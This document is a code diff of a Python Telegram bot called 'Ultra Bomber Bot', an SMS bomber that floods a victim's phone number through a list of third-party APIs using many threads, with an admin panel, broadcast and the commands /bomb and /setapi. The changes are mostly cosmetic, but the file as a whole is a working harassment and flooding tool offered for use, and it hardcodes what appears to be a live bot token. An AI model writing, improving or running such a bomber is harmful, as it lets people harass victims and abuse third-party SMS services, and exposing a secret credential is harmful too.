@@ -1,9 +1,11 @@
+# =====
 # ============================================================
 # 🔥 ULTRA BOMBER BOT — POLLING MODE 🔥
 # ============================================================
-# ✅ NO WEBHOOK NEEDED — Direct polling
+# ✅ NO FLASK — Sirf polling
+# ✅ NO WEBHOOK — Direct getUpdates
 # ✅ Runs on Railway, Termux, Render
-# ✅ Full features: APIs, Broadcast, Admin Panel, Anti-Bot
+# ✅ Full features: APIs, Broadcast, Admin Panel
 # ============================================================
 
 import requests
@@ -12,11 +14,10 @@ import time
 import threading
 import os
 import secrets
-import re
 from datetime import datetime, timedelta
 
 # ====== CONFIG ======
-BOT_TOKEN = "8643322725:AAE-SZND4HpuYyAhYF-u0fCUPdqu49p85HE"
+BOT_TOKEN = "8643322725:AAE-SZND4HpuYyAhYF-u0fCUPdqu49p85HE"  # <-- NAYA TOKEN DAALO
 OWNER_ID = "8600328303"
 MAX_BOMB_DURATION = 300  # 5 minutes
 
@@ -100,13 +101,6 @@ def api_list_inline(apis):
     keyboard.append([{"text": "🔙 Back", "callback_data": "back_apis"}])
     return {"inline_keyboard": keyboard}
 
-def api_set_inline():
-    return {
-        "inline_keyboard": [
-            [{"text": "🔙 Back", "callback_data": "back_apis"}]
-        ]
-    }
-
 # ====== STYLE HELPERS ======
 def bold(text): return f"<b>{text}</b>"
 def quote(text): return f"<blockquote>{text}</blockquote>"
@@ -163,7 +157,7 @@ def send_bomb_request(api, phone):
 
 def run_bombing(chat_id, phone, bomber_id, threads=100, delay=0.005):
     if chat_id in active_sessions and active_sessions[chat_id]["running"]:
-        send_message(chat_id, f"{bold('⚠️ Bombing already running!')}\n\n{quote('Stop it first using the stop button.')}", reply_markup=main_keyboard())
+        send_message(chat_id, f"{bold('⚠️ Bombing already running!')}", reply_markup=main_keyboard())
         return
     
     active_sessions[chat_id] = {"running": True, "phone": phone, "bomber_id": bomber_id}
@@ -184,7 +178,7 @@ def run_bombing(chat_id, phone, bomber_id, threads=100, delay=0.005):
     while active_sessions.get(chat_id, {}).get("running", False):
         if time.time() - user_bomb_start.get(chat_id, 0) > MAX_BOMB_DURATION:
             active_sessions[chat_id]["running"] = False
-            send_message(chat_id, f"{bold('⏰ TIME LIMIT REACHED!')}\n\n{quote('5-minute bombing limit exceeded.')}", reply_markup=main_keyboard())
+            send_message(chat_id, f"{bold('⏰ TIME LIMIT REACHED!')}", reply_markup=main_keyboard())
             break
         
         cycle += 1
@@ -196,7 +190,7 @@ def run_bombing(chat_id, phone, bomber_id, threads=100, delay=0.005):
         if cycle % 10 == 0:
             remaining = int(MAX_BOMB_DURATION - (time.time() - user_bomb_start.get(chat_id, 0)))
             send_message(chat_id,
-                f"{bold('📊 UPDATE')} {premium_emoji()}\n\n✅ {success} | ❌ {failed} | ⏰ {remaining}s",
+                f"{bold('📊 UPDATE')}\n\n✅ {success} | ❌ {failed} | ⏰ {remaining}s",
                 reply_markup=stop_inline_keyboard(bomber_id)
             )
         time.sleep(delay)
@@ -214,7 +208,11 @@ def handle_start(chat_id):
     user_db.add(chat_id)
     anti_bot_whitelist.add(chat_id)
     send_message(chat_id,
-        f"{bold('🔥 ULTRA BOMBER BOT 🔥')} {premium_emoji()}\n\n{quote('The most brutal SMS bomber on Telegram!')}\n\n📡 {len(API_DB)} APIs | ⏰ 5-min limit | 👑 {code(OWNER_ID)}",
+        f"{bold('🔥 ULTRA BOMBER BOT 🔥')} {premium_emoji()}\n\n"
+        f"{quote('The most brutal SMS bomber on Telegram!')}\n\n"
+        f"📡 {len(API_DB)} APIs\n"
+        f"⏰ 5-min limit\n"
+        f"👑 {code(OWNER_ID)}",
         reply_markup=main_keyboard()
     )
 
@@ -224,12 +222,6 @@ def handle_apis(chat_id):
         text += f"{idx+1}. {bold(api['name'])}\n{code(api['url'])}\n\n"
     text += f"\n{bold('Total:')} {len(API_DB)} APIs"
     send_message(chat_id, text, api_list_inline(API_DB))
-
-def handle_setapi(chat_id):
-    send_message(chat_id,
-        f"{bold('➕ ADD API')}\n\n{quote('Send: /setapi name=MyAPI url=https://api.com')}",
-        reply_markup=api_set_inline()
-    )
 
 def handle_bomb(chat_id):
     send_message(chat_id,
@@ -261,7 +253,9 @@ def handle_admin_panel(chat_id):
         send_message(chat_id, f"{bold('❌ ACCESS DENIED!')}", reply_markup=main_keyboard())
         return
     send_message(chat_id,
-        f"{bold('👑 ADMIN PANEL')}\n\n📡 APIs: {len(API_DB)}\n👥 Users: {len(user_db)}",
+        f"{bold('👑 ADMIN PANEL')}\n\n"
+        f"📡 APIs: {len(API_DB)}\n"
+        f"👥 Users: {len(user_db)}",
         reply_markup=admin_keyboard()
     )
 
@@ -290,17 +284,24 @@ def handle_broadcast(chat_id, text):
 
 def handle_help(chat_id):
     send_message(chat_id,
-        f"{bold('ℹ️ HELP')}\n\n💀 /bomb PHONE\n🛑 /stop\n📡 /apis\n👑 Admin: /broadcast, /setapi",
+        f"{bold('ℹ️ HELP')}\n\n"
+        f"💀 /bomb PHONE\n"
+        f"🛑 /stop\n"
+        f"📡 /apis\n"
+        f"👑 Admin: /broadcast, /setapi",
         reply_markup=main_keyboard()
     )
 
 # ====== MAIN POLLING LOOP ======
 def main():
-    print(f"{bold('🔥 ULTRA BOMBER BOT STARTED!')}")
+    print("="*50)
+    print("🔥 ULTRA BOMBER BOT STARTED!")
     print(f"📡 APIs: {len(API_DB)}")
     print(f"👑 Owner: {OWNER_ID}")
     print(f"⏰ Max Duration: {MAX_BOMB_DURATION}s")
-    print(f"{'='*50}\n")
+    print("="*50)
+    print("💀 Bot is running...")
+    print("🛑 Press CTRL+C to stop\n")
     
     last_update_id = 0
     
@@ -311,7 +312,7 @@ def main():
             for update in updates:
                 last_update_id = update.get("update_id")
                 
-                # ====== CALLBACK QUERY ======
+                # Callback Query
                 if "callback_query" in update:
                     callback = update["callback_query"]
                     chat_id = str(callback["message"]["chat"]["id"])
@@ -338,7 +339,7 @@ def main():
                     
                     continue
                 
-                # ====== MESSAGE ======
+                # Message
                 if "message" not in update:
                     continue
                 
@@ -404,9 +405,26 @@ def main():
             
             time.sleep(1)
             
+        except KeyboardInterrupt:
+            print("\n🛑 Bot stopped by user!")
+            break
         except Exception as e:
             print(f"❌ Error: {e}")
             time.sleep(5)
+
+def handle_setapi(chat_id):
+    send_message(chat_id,
+        f"{bold('➕ ADD API')}\n\n"
+        f"{quote('Send: /setapi name=MyAPI url=https://api.com')}",
+        reply_markup=api_set_inline()
+    )
+
+def api_set_inline():
+    return {
+        "inline_keyboard": [
+            [{"text": "🔙 Back", "callback_data": "back_apis"}]
+        ]
+    }
 
 if __name__ == "__main__":
     main()
